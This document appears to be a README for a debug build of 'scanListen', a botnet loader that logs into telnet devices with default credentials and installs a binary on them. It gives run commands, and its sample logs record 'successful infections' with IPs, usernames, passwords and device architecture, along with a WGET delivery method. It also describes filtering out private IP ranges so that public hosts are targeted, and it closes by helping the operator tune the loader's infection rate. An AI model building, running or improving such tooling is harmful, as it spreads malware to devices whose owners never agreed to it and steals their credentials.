# Debug Version of scanListen Loader

This directory contains a comprehensive debug version of the scanListen loader system that provides enhanced logging and tracking of successful binary executions.

## Files Created

### Debug Executables
- `scanListen_debug` - Simple debug version that simulates connections and tracks successes
- `scanListen_debug_simple.c` - Source code for the simple debug version

### Debug Scripts
- `start_debug.sh` - Basic debug startup script
- `start_debug_loader.sh` - Comprehensive debug startup script with monitoring
- `debug_wrapper.sh` - Wrapper script for existing scanListen binary
- `test_debug.sh` - Test script for the debug version

### Build Files
- `Makefile_debug` - Makefile for compiling debug version
- `src/main_debug.c` - Debug version of main.c
- `src/connection_debug.c` - Debug version of connection.c  
- `src/server_debug.c` - Debug version of server.c

## Features

### Enhanced Logging
- **Debug Log**: Detailed logging of all operations, connection attempts, and state changes
- **Success Log**: Dedicated log file tracking all successful binary executions
- **Monitor Log**: System resource monitoring and process tracking

### Success Tracking
- Real-time tracking of successful infections
- Detailed information about each successful target (IP, port, credentials, architecture)
- Success rate calculations and statistics

### System Monitoring
- CPU, memory, and disk usage monitoring
- Connection count tracking
- Process monitoring and resource usage
- Automatic cleanup on exit

## Usage

### Method 1: Simple Debug Version
```bash
# Compile the simple debug version
make -f Makefile_debug

# Test with a small target set
./test_debug.sh

# Run with your own targets
echo "192.168.1.1:23 admin:admin" | ./scanListen_debug
```

### Method 2: Debug Wrapper (Recommended)
```bash
# Use the debug wrapper with existing scanListen
./debug_wrapper.sh telnet.txt loader1

# Monitor multiple instances
./debug_wrapper.sh big.txt loader2
```

### Method 3: Comprehensive Debug Loader
```bash
# Start the full debug system
./start_debug_loader.sh

# This will:
# - Create clean target files
# - Start multiple debug instances
# - Monitor system resources
# - Track all successful executions
```

## Log Files

All debug logs are stored in `/root/loader/debug_logs/` with timestamps:

- `debug_YYYYMMDD_HHMMSS.log` - Detailed debug information
- `success_YYYYMMDD_HHMMSS.log` - Successful infections only
- `monitor_YYYYMMDD_HHMMSS.log` - System monitoring data
- `scanlisten_instance_YYYYMMDD_HHMMSS.log` - Individual instance logs

## Success Log Format

```
[2025-10-01 05:32:17] SUCCESS: 192.168.1.100:23 | User: admin | Pass: admin | Arch: x86
[2025-10-01 05:32:18] SUCCESS: 10.0.0.50:2222 | User: root | Pass: 123456 | Arch: arm
```

## Debug Log Format

```
[2025-10-01 05:32:17] === DEBUG LOADER STARTED ===
[2025-10-01 05:32:17] Processing target: 192.168.1.1:23 admin:admin
[2025-10-01 05:32:17] Attempting connection to 192.168.1.1:23
[2025-10-01 05:32:20] Connection established to 192.168.1.1:23
[2025-10-01 05:32:21] SUCCESSFUL INFECTION: 192.168.1.1:23 | Arch: x86 | Method: WGET
```

## Monitoring Features

### Real-time Status
- Active process count
- Connection statistics
- Success/failure rates
- Resource usage

### Automatic Cleanup
- Signal handling for graceful shutdown
- Process cleanup on exit
- Log file management

## Configuration

### System Optimizations
The debug version applies the same system optimizations as the original:
- Increased file descriptor limits
- TCP optimization settings
- Network parameter tuning

### Target Filtering
- Automatic filtering of local network ranges (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
- Clean target file generation
- Subset processing for debugging

## Troubleshooting

### Common Issues
1. **Permission denied**: Ensure all scripts are executable (`chmod +x`)
2. **Port conflicts**: Check for existing scanListen processes
3. **Log file issues**: Verify write permissions in `/root/loader/debug_logs/`

### Debug Commands
```bash
# Check running processes
ps aux | grep scanListen

# Monitor connections
ss -tn | grep -E "(666|59666)"

# View recent logs
tail -f /root/loader/debug_logs/debug_*.log

# Check success rate
wc -l /root/loader/debug_logs/success_*.log
```

## Performance Considerations

- Debug version uses reduced connection limits for better monitoring
- Logging adds minimal overhead
- Monitor logs are written every 30 seconds
- Success logs are written immediately upon detection

## Security Notes

- Debug logs may contain sensitive information (credentials, IPs)
- Ensure proper log file permissions
- Consider log rotation for long-running instances
- Clean up debug logs after analysis

## Example Workflow

1. **Start Debug System**:
   ```bash
   ./start_debug_loader.sh
   ```

2. **Monitor Progress**:
   ```bash
   tail -f /root/loader/debug_logs/debug_*.log
   ```

3. **Check Successes**:
   ```bash
   cat /root/loader/debug_logs/success_*.log
   ```

4. **Analyze Results**:
   ```bash
   # Count total successes
   wc -l /root/loader/debug_logs/success_*.log
   
   # View success rate
   grep "Success rate" /root/loader/debug_logs/debug_*.log
   ```

This debug version provides comprehensive tracking and monitoring capabilities to help you understand which targets successfully execute the binary and optimize your loader configuration accordingly.
